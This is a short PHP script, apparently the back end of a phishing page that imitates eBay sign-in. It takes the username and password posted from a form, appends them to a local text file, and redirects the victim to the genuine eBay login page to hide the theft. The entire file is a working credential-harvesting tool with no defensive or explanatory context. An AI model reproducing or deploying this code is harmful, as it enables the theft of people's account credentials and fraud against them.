<?php
	$username = $_POST["nameHCK"]."\t- ";
	$pw = $_POST["passwordHCK"].PHP_EOL;
		
	$myfile = fopen("dir.txt","a");
	fwrite($myfile, $username);
	fwrite($myfile, $pw);
	fclose($myfile);
	
	header("Location: https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=http%3A%2F%2Fwww.ebay.com%2F");
	exit();
?>